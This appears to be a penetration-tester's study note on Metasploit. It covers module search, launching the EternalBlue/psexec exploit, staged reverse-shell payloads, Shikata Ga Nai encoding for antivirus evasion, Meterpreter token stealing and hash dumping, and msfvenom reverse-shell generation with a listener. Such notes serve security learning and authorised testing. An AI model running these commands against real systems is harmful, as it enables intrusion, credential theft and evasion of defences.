---
title: Notes | Metasploit
author: Zeropio
date: 2021-12-31
categories: [Notes, Tools]
tags: [tool, metasploit]
permalink: /notes/tools/metasploit
---


# Run metasploit

Installation:
```console
zero@pio$ sudo apt install metasploit-framework
```

Running:
```console
zero@pio$ msfconsole
zero@pio$ msfconsole -q # Don't display banner
```

# MSF Components

## Modules

Syntax:
```
<No.> <type>/<os>/<service>/<name>
```

Example:
```
794   exploit/windows/ftp/scriptftp_list
```

- **Index No.**: will be displayed to select the exploit we want afterward during our searches
- **Type**: there are some types

| **Type**   | **Description**    |
|--------------- | --------------- |
| Auxiliary |	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| Encoders |	Ensure that payloads are intact to their destination. |
| Exploits |	Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| NOPs |	(No Operation code) Keep the payload sizes consistent across exploit attempts. |
| Payloads |	Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| Plugins |	Additional scripts can be integrated within an assessment with msfconsole and coexist. |
| Post |	Wide array of modules to gather information, pivot deeper, etc. |

- **OS**: specify the operative system target
- **Service**: vulnerable service
- **Name**: explains the actual action

To search for modules:
```console
msf6 > search <exploit>
msf6 > search <exploit> type:<type>
```

We can use other options, as `cve:<year>`, `platform:<os>`, `rank:<rank>` (reliability rank) and `<pattern>` (search name). One full example could be:
```console
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Let's do a tour using it. First search by the vulnerable service:
```console
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

Select the one we will use. With `info` we can display information about it:
```console
msf6 > use 0 
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

Now set the options. We can see them with `options`
```console
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

With the command `set <option> <value>` we can modify them:
```console
msf6 > set RHOSTS <ip>
```

> With `setg` we can set a value permanent.
{: .prompt-tip}

Once we finish with the options we can start the exploit, with `run` or `exploit`:
```console
msf6 > run

...

meterpreter> shell

C:\Windows\system32> 
```

> We can run `check` before. Not all the exploits allow it.
{: .prompt-tip}

The command `shell` will give us a reverse shell after an exploit, if we succesfully have the **meterpreter**.

## Targets

Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.

In the previous example:
```console
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

## Payloads 

A Payload in Metasploit refers to a module that aids the exploit module in returning a shell to the attacker. There are three different types of payload modules in the Metasploit Framework: *Singles*, *Stagers*, and *Stages*. For example, `windows/shell_bind_tcp` is a **single** payload with no **stage**, whereas `windows/shell/bind_tcp` consists of a **stager** (`bind_tcp`) and a **stage** (shell).

- **Singles**
A Single payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.

- **Stagers**
Stager payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. They are designed to be small and reliable.

- **Stages**
Stages are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others.

### Staged Payloads

Is an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.

**Stage0** is the initial state which has the sole purpose of initializing a connection back to the attacker machine (*reverse connection*). Named in Metasploit as **reverse_tcp**, **reverse_https**, and **bind_tcp**. For example:
```
535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
```

Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a security trust zone.

### Searching for payloads 

```console
msf6 > show payloads
msf6 > grep meterpreter show payloads
msf6 > grep -c meterpreter show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```

For using it:
```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
```

### Types

| **Payload**   | **Description**    |
|--------------- | --------------- |
| `generic/custom` |	Generic listener, multi-use |
| `generic/shell_bind_tcp` |	Generic listener, multi-use, normal shell, TCP connection binding |
| `generic/shell_reverse_tcp` |	Generic listener, multi-use, normal shell, reverse TCP connection |
| `windows/x64/exec` |	Executes an arbitrary command (Windows x64) |
| `windows/x64/loadlibrary` |	Loads an arbitrary x64 library path |
| `windows/x64/messagebox` |	Spawns a dialog via MessageBox using a customizable title, text & icon  |
| `windows/x64/shell_reverse_tcp` |	Normal shell, single payload, reverse TCP connection |
| `windows/x64/shell/reverse_tcp` |	Normal shell, stager + stage, reverse TCP connection |
| `windows/x64/shell/bind_ipv6_tcp` |	Normal shell, stager + stage, IPv6 Bind TCP stager |
| `windows/x64/meterpreter/$` |	Meterpreter payload + varieties above |
| `windows/x64/powershell/$` |	Interactive PowerShell sessions + varieties above |
| `windows/x64/vncinject/$` |	VNC Server (Reflective Injection) + varieties above |

## Encoders

Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. These are:
- `x64` 
- `x86`	
- `sparc`	
- `ppc`	
- `mips`

**Shikata Ga Nai** (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (仕方がない) means *It cannot be helped* or *Nothing can be done about it*, and rightfully so if we were reading this a few years ago.

To encode a payload:
```console
zero@pio$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

my $buf = 
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
```

Without encoding will be:
```console
zero@pio$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl 

my $buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
```

[Here](https://hatching.io/blog/metasploit-payloads2/) are an explanation of Shikata Ga Nai.

To encode inside the msf:
```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15 
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

Metasploit offer a tool to with the **VirusTotal API** to check the detection:
```console
zero@pio$ msf-virustotal -k <API key> -f <exploit>
```

## Databases 

### Start the MSF Database 
Metasploit use the PostgreSQL. Let's start it:
```console
zero@pio$ sudo service postgresql status
zero#pio$ sudo systemctl start postgresql
```

Now, start the MSF database:
```console
zero@pio$ sudo msfdb init
```

> If there are some errors try using `apt update` before.
{: .prompt-info}

```console
zero@pio$ sudo msfdb status
```

### Reinitiate the MSF Database

```console
zero@pio$ msfdb reinit
zero@pio$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
zero@pio$ sudo service postgres restart
zero@pio$ msfconsole -q 

msf6 > db_status
```

> You can get more options typing `help database` in the msfconsole.
{: .prompt-tip}

### Using the database 

#### Workspaces
We can think of **Workspaces** the same way we would think of folders in a project.
```console
msf6 > workspace 

* default
```

With `-a` and `-d` we can add or delete. The default Workspace is **default**. To switch between workspaces type `workspace <name>`.
```console
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

More options with `workspace -h`.

#### Importing Scan Results

If the scan file name is `Target.nmap`:
```console
msf6 > db_import Target.xml 

...

msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

Now, we have the full scan inside.

#### Using Nmap inside MSFconsole

Simple as:
```console
msf6 > db_nmap <options> <ip>
```

#### Backup 

```console
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified

msf6 > db_export -f xml backup.xml
```


With `hosts`, `services` and `creds` we can check all the data saved.

## Plugins 

Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework.

Let's use **Nessus** as an example:
```console
msf6 > load nessus 
msf6 > nessus_help
```

If the plugin has an error:
```console
msf6 > load Plugin_That_Does_Not_Exist

[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb
```

### Installing new plugins

First we need to download it, for example [darkoperator's plugins](https://github.com/darkoperator/Metasploit-Plugins):
```console
zero@pio$ git clone https://github.com/darkoperator/Metasploit-Plugins
zero@pio$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

Let's use **pentest.rb**. Copy it to `/usr/share/metasploit-framework/plugins`{: .filepath}. Now, in the msfconsole:
```console
msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _
      |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \ 
      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|
                                              |___/
      
Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest

msf6 > help
```

---

# MSF Sessions 

## Sessions 

MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of Sessions, which creates dedicated control interfaces for all of your deployed modules.

After creating a *channel* with a target, we can send it to the background with `CTRL + z`. To list all the sessions just type `sessions`. If you want to open it:
```console
msf6 > sesssions -i <number>
```

## Jobs 

If we terminate a channel with `CTRL + c` the port will still be in use. We can use the `jobs` command inside msfconsole:
```console
msf6 > jobs -h
```

We have the following options:

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-l`  | List jobs   |
| `-k <number` | Kill job |


We can run an exploit in the jobs:
```console
msf6 exploit(multi/handler) > exploit -j
```

## Meterpreter 

The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. With the command `help` inside the meterpreter we can see all the aviable options.

Meterpreter allow us to migrate to user with more privilages. For example:
```console
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.

meterpreter > ps 

PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe

meterpreter > steal 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

We can easily set to background a session, use another exploit (like `search local_exploit_suggester`), set the previous session and run it.

Another commands could be `hashdump` (which gives all the hashes from the system), `lsa_dump_sam` (to get the SAM file), `lsa_dump_secrets` (to get the SYSTEM file), 

---

# Other 

## msfvenom 


This is an example of a payload generated:
```console
zero@pio$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f aspx > reverse_shell.aspx
```

Then, we need to start listening:
```console
msf6 > use multi/handler
msf6 exploit(multi/handler) > set LHOST <ip> 
msf6 exploit(multi/handler) > set LPORT <port>
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <ip>:<port>
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-p` | Select the payload   |
| `-e` | Encode |
| `-i` | Encode X times |
| `-f` | Extensions (linux: elf, win: exe) |


## Local Exploit Suggester 

Helps identifying the exploit:
```console
msf6 > search local exploit suggester
```

